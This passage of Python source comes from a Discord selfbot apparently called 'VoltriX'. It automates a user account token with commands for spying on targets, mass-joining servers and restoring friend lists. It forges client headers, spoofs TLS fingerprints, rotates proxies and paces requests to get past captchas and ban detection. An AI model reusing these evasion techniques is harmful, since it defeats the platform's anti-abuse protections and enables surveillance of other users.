        save_spy_data(spy_config)

        await ctx.send("Spy removed")


@voltrix.command()
async def spy_list(ctx):

    await ctx.message.delete()

    users = spy_config["spy_data"]

    if not users:
        return await ctx.send("No targets")

    msg="\n".join(f"<@{uid}>" for uid in users)

    await ctx.send(msg)


@voltrix.command()
async def clear_spy(ctx):

    await ctx.message.delete()

    spy_config["spy_data"]={}

    save_spy_data(spy_config)

    await ctx.send("Spy list cleared")
    
from datetime import datetime
import asyncio

@voltrix.command()
async def leaveallservers(ctx):
    global leaveCommand
    leaveCommand = True

    confirm_msg = await ctx.send("Are you sure? (Send `y` to confirm, anything else will cancel.)")

    def check(m):
        return (
            m.author.id == ctx.author.id
            and m.channel.id == ctx.channel.id
        )

    try:
        msg = await voltrix.wait_for("message", check=check, timeout=30.0)
    except asyncio.TimeoutError:
        await confirm_msg.edit(content="Timed out. Please try again.")
        return

    if msg.content.lower() == "y":
        await msg.delete()

        for guild in list(voltrix.guilds):
            if not leaveCommand:
                return
            try:
                await guild.leave()
                await asyncio.sleep(1)
            except Exception:
                pass

        await confirm_msg.edit(content="Successfully left all servers.")
    else:
        await confirm_msg.edit(content="Cancelled.")
        
@voltrix.command()
async def p(ctx, user: discord.User= None):
    await ctx.message.delete()
    user = user or ctx.author
    target_channel = voltrix.get_channel(1022658564176748614)  
    if not target_channel:
        return
    await target_channel.send(f"+p {user.id}")
    def check(message):
        return (
            message.author.id == 706874685144432641 and
            message.channel.id == target_channel.id and
            len(message.embeds) > 0
        )
    reply = await voltrix.wait_for("message", check=check)
    await reply.forward(ctx)

import re
try:
    import lavalink
except ImportError:
    lavalink = None

@voltrix.command()
async def music(ctx: commands.Context):
    await ctx.message.delete()
    with open('config/music_config.json', 'r') as config_file:
        config = json.load(config_file)
    prefix = config.get('prefix')
    content = (
        f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
        f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
        f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
        f"<:exchange:1325732637821898795> | **Join VC** **:** **`{prefix}mjoin`**\n"
        f"<:exchange:1325732637821898795> | **Leave VC** **:** **`{prefix}mleave`**\n"
        f"<:exchange:1325732637821898795> | **Play Music** **:** **`{prefix}mplay [query/url]`**\n"
        f"<:exchange:1325732637821898795> | **Pause / Resume** **:** **`{prefix}mpause`** / **`{prefix}mresume`**\n"
        f"<:exchange:1325732637821898795> | **Skip / Stop** **:** **`{prefix}mskip`** / **`{prefix}mstop`**\n"
        f"<:exchange:1325732637821898795> | **Queue / Now Playing** **:** **`{prefix}mqueue`** / **`{prefix}mnowplaying`**\n"
        f"<:exchange:1325732637821898795> | **Clear Queue** **:** **`{prefix}clearqueue`**\n"
        f"<:exchange:1325732637821898795> | **Adjust/Check Volume** **:** **`{prefix}mvolume <0-100>`**\n"
        f"<:exchange:1325732637821898795> | **Text-to-Speech** **:** **`{prefix}mtts [message]`**\n"
        f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"         
    )
    await send(ctx,"<:devs:1290693770567749652>__Music ALT Cmds__<:Titanz:1281243489635405827>",content,"Only use in any mutual server with your ALT")

def build_xsuper():
    session = tls_client.Session(client_identifier="chrome_124")
    request = session.get("https://discord.com/login")

    match = re.search(r'"BUILD_NUMBER":"(\d+)"', request.text)
    build_number = match.group(1) if match else None

    chrome_versions = requests.get("https://googlechromelabs.github.io/chrome-for-testing/latest-versions-per-milestone.json").json()
    latest_milestone = max(map(int, chrome_versions["milestones"].keys()))
    latest_version = chrome_versions["milestones"][str(latest_milestone)]["version"]

    props = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en-US",
        "browser_user_agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{latest_version} Safari/537.36",
        "browser_version": latest_version,
        "os_version": "10",
        "referrer": "https://discord.com",
        "referring_domain": "discord.com",
        "referrer_current": "https://discord.com",
        "referring_domain_current": "discord.com",
        "release_channel": "stable",
        "client_build_number": build_number,
        "client_event_source": None
    }

    x_super = base64.b64encode(json.dumps(props, separators=(',', ':')).encode()).decode()
    return x_super, latest_version, props["browser_user_agent"]

def create_guild(session, name, headers):
    data = {
        "name": name,
        "icon": None,
        "channels": [],
        "system_channel_id": None
    }
    return session.post("https://discord.com/api/v9/guilds", headers=headers, json=data)

def get_default_channel(session, guild_id, headers):
    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    resp = session.get(url, headers=headers)
    if resp.status_code == 200:
        for channel in resp.json():
            if channel["type"] == 0:
                return channel["id"]
    return None

def create_invite(session, channel_id, headers):
    url = f"https://discord.com/api/v9/channels/{channel_id}/invites"
    data = {
        "max_age": 0,
        "max_uses": 0,
        "temporary": False,
        "flags": 0
    }
    return session.post(url, headers=headers, json=data)

@voltrix.command()
async def view(ctx, message_reference: str = None):
    await ctx.message.delete()

    referenced_message = None

    dm_url_pattern = re.compile(r"https?:\/\/(?:ptb\.|canary\.)?discord\.com\/channels\/@me\/(\d+)\/(\d+)")
    guild_url_pattern = re.compile(r"https?:\/\/(?:ptb\.|canary\.)?discord\.com\/channels\/(\d+)\/(\d+)\/(\d+)")

    # ---------------- URL or ID Handling ----------------
    if message_reference:

        # DM URL
        dm_match = dm_url_pattern.match(message_reference)
        if dm_match:
            channel_id, message_id = map(int, dm_match.groups())
            try:
                channel = await ctx.bot.fetch_channel(channel_id)
                referenced_message = await channel.fetch_message(message_id)
            except Exception as e:
                await senderror(ctx, "VoltriX Viewer", f"Failed to access DM message: `{e}`")
                return

        # Guild URL
        else:
            guild_match = guild_url_pattern.match(message_reference)
            if guild_match:
                _, channel_id, message_id = map(int, guild_match.groups())
                channel = ctx.bot.get_channel(channel_id)

                if not channel:
                    await senderror(ctx, "VoltriX Viewer", "Invalid channel in URL.")
                    return

                try:
                    referenced_message = await channel.fetch_message(message_id)
                except (discord.NotFound, discord.Forbidden):
                    await senderror(ctx, "VoltriX Viewer", "Cannot access that message.")
                    return

            # Message ID
            elif message_reference.isdigit():
                message_id = int(message_reference)

                for channel in ctx.bot.get_all_channels():
                    if isinstance(channel, discord.TextChannel):
                        try:
                            referenced_message = await channel.fetch_message(message_id)
                            break
                        except (discord.NotFound, discord.Forbidden):
                            continue

                if not referenced_message:
                    await senderror(ctx, "VoltriX Viewer", "Message ID not found.")
                    return

    # ---------------- Reply Handling ----------------
    elif ctx.message.reference:
        try:
            referenced_message = await ctx.channel.fetch_message(
                ctx.message.reference.message_id
            )
        except:
            pass

    if not referenced_message:
        await senderror(ctx, "VoltriX Viewer",
                        "Reply to a message with a file, provide a message ID, or valid message URL.")
        return

    if not referenced_message.attachments:
        await senderror(ctx, "VoltriX Viewer", "Referenced message has no file.")
        return

    attachment = referenced_message.attachments[0]

    # Safer filename
    random_name = f"{uuid.uuid4().hex}_{attachment.filename}"
    file_path = os.path.join(UPLOAD_DIR, random_name)

    async with aiohttp.ClientSession() as session:
        async with session.get(attachment.url) as resp:
            if resp.status == 200:
                with open(file_path, "wb") as f:
                    f.write(await resp.read())

                hosted_link = HOST_URL + random_name

                await send(
                    ctx,
                    "VoltriX Viewer",
                    f"# 🔎 [**__View here__**]({hosted_link})"
                )
            else:
                await senderror(ctx, "VoltriX Viewer", "Failed to download file.")
                
@voltrix.command(aliases=['crsrv','createsrv','servercreate','srvcr','srvcreate'])
async def createserver(ctx, *, name: str=None):
    await ctx.message.delete()
    name = name or f"{ctx.author.name}'s Server"
    temp = await send(ctx, "Creating Server", f"**Creating Server with name `{name}`...**")
    tkn = token
    x_super, milestone, user_agent = build_xsuper()
    headers = {
        "Authorization": tkn,
        "Content-Type": "application/json",
        "User-Agent": user_agent,
        "X-Super-Properties": x_super,
        "X-Discord-Locale": "en-US",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Timezone": "Asia/Kolkata"
    }
    session = tls_client.Session(client_identifier="chrome_124", random_tls_extension_order=True)
    resp = create_guild(session, name, headers)
    if resp.status_code != 201:
        return await send(ctx, "❌ Failed", f"Failed to create Server.\n`{resp.text}`")
    guild_id = resp.json()["id"]
    await asyncio.sleep(2)
    channel_id = get_default_channel(session, guild_id, headers)
    if not channel_id:
        return await send(ctx, "⚠️ Server Created", "Server was created, but no default channel was found to create an invite.")
    invite_resp = create_invite(session, channel_id, headers)
    if invite_resp.status_code == 200:
        invite_code = f"{invite_resp.json()['code']}"
        invite_url = f"https://discord.gg/{invite_code}"
        await temp.delete()
        await send(ctx, "Server Created", f"**Server created successfully!**\n**Name :** **`{name}`**\n**Server ID :** **`{guild_id}`**\n**Invite :** **{invite_url}** ")
        await ctx.send(f"discord.gg/{invite_code}")
    else:
        await send(ctx, "Server Created", "**Server was created, but couldn’t create an invite link.**")

# ==========================================
# BACKUP & RESTORE SERVER COMMANDS
# ==========================================

def is_personal_computer():
    import os
    if os.name == 'nt':
        return True
    if os.path.exists('/.dockerenv'):
        return False
    if os.path.exists('/proc/1/cgroup'):
        try:
            with open('/proc/1/cgroup', 'r') as f:
                content = f.read()
                if 'docker' in content or 'kubepods' in content:
                    return False
        except Exception:
            pass
    if os.environ.get('PTERODACTYL') or os.environ.get('SERVER_PORT') or os.environ.get('CONTAINER_UUID'):
        return False
    if not os.environ.get('DISPLAY') and not os.environ.get('WAYLAND_DISPLAY'):
        return False
    return True

def check_chromium_installed():
    import os
    try:
        from truedriver.core.config import find_executable
        find_executable("chrome")
        return True
    except Exception:
        # Standard system paths on Windows
        standard_paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
        ]
        local_appdata = os.environ.get("LOCALAPPDATA")
        if local_appdata:
            standard_paths.append(os.path.join(local_appdata, "Google", "Chrome", "Application", "chrome.exe"))
            
        for path in standard_paths:
            if os.path.exists(path):
                return True
                
        # Standard system paths on Linux
        linux_paths = [
            "/usr/bin/chromium-browser",
            "/usr/bin/google-chrome",
            "/usr/bin/chrome"
        ]
        for path in linux_paths:
            if os.path.exists(path):
                return True
                
        home = os.environ.get("HOME")
        if home:
            possible_path = os.path.join(home, "chromium", "chrome")
            if os.path.exists(possible_path):
                if os.path.dirname(possible_path) not in os.environ["PATH"]:
                    os.environ["PATH"] = f"{os.path.dirname(possible_path)}:{os.environ['PATH']}"
                return True
        return False

async def install_chromium(ctx):
    import platform
    import urllib.request
    import zipfile
    import shutil
    import subprocess
    import os
    import asyncio
    
    os_name = platform.system().lower()
    status_msg = await ctx.send("⏳ **Installing Chromium... This might take a couple of minutes.**")
    
    if os_name == "windows":
        try:
            process = subprocess.run(
                ["winget", "install", "Google.Chrome", "--silent", "--accept-source-agreements", "--accept-package-agreements"],
                capture_output=True, text=True
            )
            if process.returncode == 0:
                await status_msg.edit(content="✅ **Chrome installed successfully via winget!**")
                return True
        except Exception:
            pass
            
        try:
            local_appdata = os.environ.get("LOCALAPPDATA")
            if not local_appdata:
                await status_msg.edit(content="❌ **LOCALAPPDATA environment variable not found. Cannot install portable Chromium.**")
                return False
                
            dest_dir = os.path.join(local_appdata, "Google", "Chrome", "Application")
            os.makedirs(dest_dir, exist_ok=True)
            
            url = "https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1182272/chrome-win.zip"
            zip_path = os.path.join(local_appdata, "chrome-win.zip")
            await status_msg.edit(content="📥 **Downloading portable Chromium snapshot (Windows Win_x64)...**")
            
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, urllib.request.urlretrieve, url, zip_path)
            
            await status_msg.edit(content="📦 **Extracting Chromium...**")
            
            def extract_zip():
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(local_appdata)
            
            await loop.run_in_executor(None, extract_zip)
            
            extracted_dir = os.path.join(local_appdata, "chrome-win")
            
            def move_files():
                for filename in os.listdir(extracted_dir):
                    src_file = os.path.join(extracted_dir, filename)
                    dst_file = os.path.join(dest_dir, filename)
                    if os.path.isdir(src_file):
                        if os.path.exists(dst_file):
                            shutil.rmtree(dst_file)
                        shutil.copytree(src_file, dst_file)
                    else:
                        shutil.copy2(src_file, dst_file)
                shutil.rmtree(extracted_dir)
                if os.path.exists(zip_path):
                    os.remove(zip_path)
                    
            await loop.run_in_executor(None, move_files)
            await status_msg.edit(content="✅ **Portable Chromium downloaded and installed successfully!**")
            return True
            
        except Exception as e:
            await status_msg.edit(content=f"❌ **Failed to download portable Chromium:** `{e}`")
            return False
            
    elif os_name == "linux":
        try:
            process = subprocess.run(
                ["sudo", "apt-get", "update"], capture_output=True, text=True
            )
            process2 = subprocess.run(
                ["sudo", "apt-get", "install", "-y", "chromium-browser"],
                capture_output=True, text=True
            )
            if process2.returncode == 0:
                await status_msg.edit(content="✅ **Chromium installed successfully via apt!**")
                return True
        except Exception:
            pass
            
        try:
            home = os.environ.get("HOME")
            if not home:
                await status_msg.edit(content="❌ **HOME environment variable not found. Cannot install portable Chromium.**")
                return False
                
            dest_dir = os.path.join(home, "chromium")
            zip_path = os.path.join(home, "chrome-linux.zip")
            await status_msg.edit(content="📥 **Downloading portable Chromium (Linux)...**")
            
            url = "https://commondatastorage.googleapis.com/chromium-browser-snapshots/Linux_x64/1182272/chrome-linux.zip"
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, urllib.request.urlretrieve, url, zip_path)
            
            await status_msg.edit(content="📦 **Extracting Chromium...**")
            
            def extract_zip():
                if os.path.exists(dest_dir):
                    shutil.rmtree(dest_dir)
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(home)
                extracted_dir = os.path.join(home, "chrome-linux")
                os.rename(extracted_dir, dest_dir)
                if os.path.exists(zip_path):
                    os.remove(zip_path)
                    
            await loop.run_in_executor(None, extract_zip)
            
            chrome_bin = os.path.join(dest_dir, "chrome")
            if os.path.exists(chrome_bin):
                os.chmod(chrome_bin, 0o755)
                
            if dest_dir not in os.environ["PATH"]:
                os.environ["PATH"] = f"{dest_dir}:{os.environ['PATH']}"
                
            await status_msg.edit(content="✅ **Portable Chromium downloaded and path configured successfully!**")
            return True
            
        except Exception as e:
            await status_msg.edit(content=f"❌ **Failed to install portable Chromium:** `{e}`")
            return False
    else:
        await status_msg.edit(content=f"❌ **Unsupported OS for automatic installation:** `{os_name}`")
        return False

async def get_or_create_invite(guild):
    # 1. Try to fetch existing invites first (only 1 API call)
    try:
        invites = await guild.invites()
        for inv in invites:
            if inv.url:
                return inv.url
    except Exception:
        pass
        
    # 2. Find a text/voice channel where we have create_instant_invite permission
    me = guild.me
    if me:
        for channel in guild.text_channels:
            try:
                perms = channel.permissions_for(me)
                if perms.create_instant_invite:
                    invite = await channel.create_invite(max_age=0, max_uses=0, temporary=False)
                    return invite.url
            except Exception:
                continue
                
        for channel in guild.voice_channels:
            try:
                perms = channel.permissions_for(me)
                if perms.create_instant_invite:
                    invite = await channel.create_invite(max_age=0, max_uses=0, temporary=False)
                    return invite.url
            except Exception:
                continue
                
    # 3. Fallback: try creating invite in the first 3 text/voice channels
    for channel in guild.text_channels[:3]:
        try:
            invite = await channel.create_invite(max_age=0, max_uses=0, temporary=False)
            return invite.url
        except Exception:
            continue
            
    for channel in guild.voice_channels[:3]:
        try:
            invite = await channel.create_invite(max_age=0, max_uses=0, temporary=False)
            return invite.url
        except Exception:
            continue
            
    return "N/A"

@voltrix.command(aliases=['backupsrv', 'srvbackup', 'backupguilds'])
async def backupservers(ctx):
    await ctx.message.delete()
    status_msg = await ctx.send("⏳ **Backing up servers... Please wait.**")
    
    guilds = list(voltrix.guilds)
    total_guilds = len(guilds)
    
    sem = asyncio.Semaphore(5)  # Limit concurrency to 5 concurrent tasks to avoid 429
    
    async def backup_one_guild(guild):
        async with sem:
            try:
                invite_link = await asyncio.wait_for(get_or_create_invite(guild), timeout=4.0)
            except Exception:
                invite_link = "N/A"
            return (guild.name, guild.id, invite_link)
            
    tasks = [backup_one_guild(g) for g in guilds]
    results = await asyncio.gather(*tasks)
    
    try:
        with open("serversbackup.txt", "w", encoding="utf-8") as f:
            for name, gid, link in results:
                f.write(f"Name: {name} | ID: {gid} | Link: {link}\n")
                
        await status_msg.edit(content=f"✅ **Servers backed up successfully!**\n📁 Total servers: `{total_guilds}` saved in `serversbackup.txt`.")
    except Exception as e:
        await status_msg.edit(content=f"❌ **Failed to write backup file:** `{e}`")

@voltrix.command(aliases=['restoresrv', 'srvrestore', 'restoreguilds'])
async def restoreservers(ctx):
    await ctx.message.delete()
    
    if not os.path.exists("serversbackup.txt"):
        return await ctx.send("❌ **Backup file `serversbackup.txt` not found! Please run the backup command first.**")
        
    menu = (
        "⚡ **Server Restore Menu**\n"
        "Please select a mode by replying with `1` or `2`:\n\n"
        "1️⃣ **Manual Mode** - Sends the invite links of all backed-up servers in this channel (split to avoid character limits).\n"
        "2️⃣ **Direct Joiner** - Joins servers directly via HTTP requests without captcha solving (Fails if account gets captchas)."
    )
    
    menu_msg = await ctx.send(menu)
    
    def check(message):
        return message.author == ctx.author and message.channel == ctx.channel and message.content.strip() in ["1", "2"]
        
    try:
        msg = await voltrix.wait_for("message", check=check, timeout=60.0)
        mode = msg.content.strip()
        await msg.delete()
    except asyncio.TimeoutError:
        return await menu_msg.edit(content="❌ **Timed out. Cancelled server restore.**")
        
    await menu_msg.delete()
    
    servers = []
    with open("serversbackup.txt", "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                name_part, id_part, link_part = line.split(" | ")
                name = name_part.split("Name: ")[1]
                gid = id_part.split("ID: ")[1]
                link = link_part.split("Link: ")[1]
                servers.append({"name": name, "id": gid, "link": link})
            except Exception:
                continue
                
    if not servers:
        return await ctx.send("❌ **No servers found in `serversbackup.txt` or formatting is invalid!**")
        
    if mode == "1":
        status_msg = await ctx.send("⏳ **Formatting invite links...**")
        
        messages_to_send = []
        current_msg = "📋 **List of Backed up Servers:**\n"
        
        for s in servers:
            entry = f"• **{s['name']}** (ID: `{s['id']}`) - {s['link']}\n"
            if len(current_msg) + len(entry) > 1900:
                messages_to_send.append(current_msg)
                current_msg = entry
            else:
                current_msg += entry
        if current_msg:
            messages_to_send.append(current_msg)
            
        await status_msg.delete()
        for msg_text in messages_to_send:
            await ctx.send(msg_text)
            await asyncio.sleep(0.5)
            
    elif mode == "2":
        status_msg = await ctx.send("⏳ **Starting restore using Direct Joiner...**")
        
        import aiohttp
        import string
        import random
        
        def ran_str(length=32):
            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
            
        success_count = 0
        fail_count = 0
        captcha_fail_count = 0
        
        for idx, s in enumerate(servers):
            invite_link = s["link"]
            invite_code = invite_link
            for prefix in ["https://discord.gg/", "http://discord.gg/", "discord.gg/",
                            "https://discord.com/invite/", "http://discord.com/invite/"]:
                if invite_code.startswith(prefix):
                    invite_code = invite_code[len(prefix):]
                    break
                    
            await status_msg.edit(content=f"⏳ **[{idx+1}/{len(servers)}] Joining {s['name']}...**")
            
            # Format headers
            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "authorization": token,
                "content-type": "application/json",
                "origin": "https://discord.com",
                "referer": "https://discord.com",
                "sec-ch-ua": '"Not)A;Brand";v="99", "Chromium";v="126", "Google Chrome";v="126"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            }
            
            # Proxy handling
            proxies_path = "proxies.txt"
            proxy_list = []
            if os.path.exists(proxies_path):
                try:
                    with open(proxies_path, "r", encoding="utf-8") as f:
                        proxy_list = [l.strip() for l in f if l.strip()]
                except:
                    pass
            proxy_url = None
            if proxy_list:
                proxy = random.choice(proxy_list)
                if not (proxy.startswith("http://") or proxy.startswith("https://") or proxy.startswith("socks5://") or proxy.startswith("socks4://")):
                    proxy_url = "http://" + proxy
                else:
                    proxy_url = proxy
            
            joined = False
            try:
                url = f"https://discord.com/api/v9/invites/{invite_code}"
                payload = {"session_id": ran_str()}
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, headers=headers, json=payload, proxy=proxy_url, timeout=15) as resp:
                        if resp.status == 200:
                            joined = True
                        elif resp.status in [400, 403]:
                            try:
                                data = await resp.json()
                                if "captcha_sitekey" in data:
                                    captcha_fail_count += 1
                            except:
                                pass
                        elif resp.status == 429:
                            try:
                                rdata = await resp.json()
                                retry_after = rdata.get("retry_after", 5)
                                await asyncio.sleep(retry_after)
                                async with session.post(url, headers=headers, json=payload, proxy=proxy_url, timeout=15) as retry_resp:
                                    if retry_resp.status == 200:
                                        joined = True
                            except:
                                pass
            except Exception:
                pass
                
            if joined:
                success_count += 1
            else:
                fail_count += 1
                if captcha_fail_count >= 3:
                    await status_msg.edit(content=f"❌ **Command failed. Multiple captchas/failures detected.** Joined `{success_count}` servers. Please use Manual Mode (Mode 1) for joining.")
                    return
                    
            await asyncio.sleep(2)
            
        await status_msg.edit(content=f"✅ **servers backup restored successfully**\nJoined: `{success_count}` | Failed: `{fail_count}`")

# ==========================================
# FRIENDS BACKUP & RESTORE COMMANDS
# ==========================================

@voltrix.command(aliases=['backupfr', 'frbackup', 'backupfriendslist'])
async def backupfriends(ctx):
    await ctx.message.delete()
    status_msg = await ctx.send("⏳ **Backing up friends... Please wait.**")
    
    tkn = token
    x_super, milestone, user_agent = build_xsuper()
    headers = {
        "Authorization": tkn,
        "Content-Type": "application/json",
        "User-Agent": user_agent,
        "X-Super-Properties": x_super,
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Kolkata"
    }
    
    session = tls_client.Session(client_identifier="chrome_124", random_tls_extension_order=True)
    resp = session.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
    
    if resp.status_code != 200:
        return await status_msg.edit(content=f"❌ **Failed to fetch relationships:** `{resp.text}`")
        
    try:
        relationships = resp.json()
    except Exception as e:
        return await status_msg.edit(content=f"❌ **Failed to parse response:** `{e}`")
        
    friends = [r for r in relationships if r.get("type") == 1]
    total_friends = len(friends)
    
    try:
        with open("friendsbackup.txt", "w", encoding="utf-8") as f:
            for fr in friends:
                user_info = fr.get("user", {})
                username = user_info.get("username", "")
                user_id = user_info.get("id", "")
                f.write(f"Username: {username} | ID: {user_id}\n")
                
        await status_msg.edit(content=f"✅ **Friends backed up successfully!**\n📁 Saved `{total_friends}` friends to `friendsbackup.txt`.")
    except Exception as e:
        await status_msg.edit(content=f"❌ **Failed to write backup file:** `{e}`")

@voltrix.command(aliases=['restorefr', 'frrestore', 'restorefriendslist'])
async def restorefriends(ctx):
    await ctx.message.delete()
    
    if not os.path.exists("friendsbackup.txt"):
        return await ctx.send("❌ **Backup file `friendsbackup.txt` not found! Please run the backup command first.**")
        
    status_msg = await ctx.send("⏳ **Starting friends restore... Fetching current relationships list.**")
    
    tkn = token
    x_super, milestone, user_agent = build_xsuper()
    headers = {
        "Authorization": tkn,
        "Content-Type": "application/json",
        "User-Agent": user_agent,
        "X-Super-Properties": x_super,
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Kolkata"
    }
    
    session = tls_client.Session(client_identifier="chrome_124", random_tls_extension_order=True)
    
    # 1. Fetch current relationships
    resp = session.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
    if resp.status_code != 200:
        return await status_msg.edit(content=f"❌ **Failed to fetch current relationships list:** `{resp.text}`")
        
    try:
        current_relations = resp.json()
    except Exception as e:
        return await status_msg.edit(content=f"❌ **Failed to parse relationships response:** `{e}`")
        
    existing_relationship_ids = {str(r.get("id")) for r in current_relations}
    
    # 2. Read backup file
    backup_friends = []
    with open("friendsbackup.txt", "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                user_part, id_part = line.split(" | ")
                username = user_part.split("Username: ")[1]
                user_id = id_part.split("ID: ")[1]
                backup_friends.append({"username": username, "id": user_id})
            except Exception:
                continue
                
    if not backup_friends:
        return await status_msg.edit(content="❌ **No friends found in `friendsbackup.txt` or formatting is invalid!**")
        
    # 3. Filter friends who are not currently related
    to_add = [f for f in backup_friends if f["id"] not in existing_relationship_ids]
    
    if not to_add:
        return await status_msg.edit(content="✅ **All friends from backup are already in your friends/relationships list!**")
        
    total_to_add = len(to_add)
    await status_msg.edit(content=f"⏳ **Found `{total_to_add}` friends to restore. Beginning restore with anti-ban delays.**")
    
    success_count = 0
    failed_users = []
    captcha_occurred = False
    
    for idx, friend in enumerate(to_add):
        target_username = friend["username"]
        target_id = friend["id"]
        
        await status_msg.edit(content=f"⏳ **[{idx+1}/{total_to_add}] Sending request to `{target_username}`...**")
        
        while True:
            # We attempt PUT to add friend by ID
            put_url = f"https://discord.com/api/v9/users/@me/relationships/{target_id}"
            
            # Rebuild xsuper occasionally to mimic rotation
            current_x_super, _, current_ua = build_xsuper()
            request_headers = {
                "Authorization": tkn,
                "Content-Type": "application/json",
                "User-Agent": current_ua,
                "X-Super-Properties": current_x_super,
                "X-Discord-Locale": "en-US",
                "X-Discord-Timezone": "Asia/Kolkata"
            }
            
            put_resp = session.put(put_url, headers=request_headers, json={})
            
            # Handle rate limit (429)
            if put_resp.status_code == 429:
                try:
                    retry_after = put_resp.json().get("retry_after", 10.0)
                except:
                    retry_after = 15.0
                await ctx.send(f"⚠️ **Rate limited! Sleeping for `{retry_after + 5}` seconds before retrying...**")
                await asyncio.sleep(retry_after + 5)
                continue
                
            # Check for Captcha
            resp_text = put_resp.text
            if put_resp.status_code in [400, 403] and ("captcha" in resp_text.lower() or "captcha_key" in resp_text or "captcha_sitekey" in resp_text):
                captcha_occurred = True
                failed_users.append(target_username)
                break
                
            if put_resp.status_code in [200, 201, 204]:
                success_count += 1
            else:
                # If PUT by ID fails, fallback to POST by username
                post_url = "https://discord.com/api/v9/users/@me/relationships"
                post_resp = session.post(post_url, headers=request_headers, json={"username": target_username})
                
                if post_resp.status_code == 429:
                    try:
                        retry_after = post_resp.json().get("retry_after", 10.0)
                    except:
                        retry_after = 15.0
                    await ctx.send(f"⚠️ **Rate limited! Sleeping for `{retry_after + 5}` seconds before retrying...**")
                    await asyncio.sleep(retry_after + 5)
                    continue
                    
                resp_text = post_resp.text
                if post_resp.status_code in [400, 403] and ("captcha" in resp_text.lower() or "captcha_key" in resp_text or "captcha_sitekey" in resp_text):
                    captcha_occurred = True
                    failed_users.append(target_username)
                    break
                    
                if post_resp.status_code in [200, 201, 204]:
                    success_count += 1
                else:
                    failed_users.append(target_username)
            break
            
        if captcha_occurred:
            # Add remaining users in the iteration to the failed/manual list
            for remaining_friend in to_add[idx:]:
                if remaining_friend["username"] not in failed_users:
                    failed_users.append(remaining_friend["username"])
            break
            
        # Apply anti-ban humanized delay (30 to 60 seconds)
        if idx < total_to_add - 1:
            delay = random.uniform(30, 60)
            await asyncio.sleep(delay)
            
    if captcha_occurred:
        manual_list = "\n".join([f"• `{u}`" for u in failed_users])
        if len(manual_list) > 1500:
            manual_list = manual_list[:1500] + "\n...[list truncated]"
            
        await status_msg.edit(
            content=(
                f"❌ **Command halted due to captcha challenge!**\n"
                f"To protect your account from getting disabled, the restore process has been stopped.\n"
                f"Successfully sent request to `{success_count}` friends.\n\n"
                f"**Please manually add the remaining usernames:**\n{manual_list}"
            )
        )
    else:
        await status_msg.edit(content=f"✅ **friends backup restored successfully**\nSuccessfully sent requests to `{success_count}` friends.")

class alts(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # Maps channel_id -> list of AltVCSession
        self._vc_sessions: dict = {}

    # ─────────────────────────────────────────────────────────────
    # Internal VC Session class — one instance per alt token in VC
    # ─────────────────────────────────────────────────────────────
    class AltVCSession:
        GATEWAY = "wss://gateway.discord.gg/?v=10&encoding=json"

        def __init__(self, token: str, guild_id: str, channel_id: str):
            self.token = token
            self.guild_id = str(guild_id)
            self.channel_id = str(channel_id)
            self._ws = None
            self._task: asyncio.Task | None = None
            self._stop_event = asyncio.Event()

        async def start(self):
            self._stop_event.clear()
            self._task = asyncio.create_task(self._run())

        async def stop(self):
            self._stop_event.set()
            if self._ws and not self._ws.closed:
                try:
                    # Send leave (channel_id=None) before closing
                    await self._ws.send_json({
                        "op": 4,
                        "d": {
                            "guild_id": self.guild_id,
                            "channel_id": None,
                            "self_mute": True,
                            "self_deaf": True
                        }
                    })
                    await asyncio.sleep(0.3)
                    await self._ws.close()
                except Exception:
                    pass
            if self._task and not self._task.done():
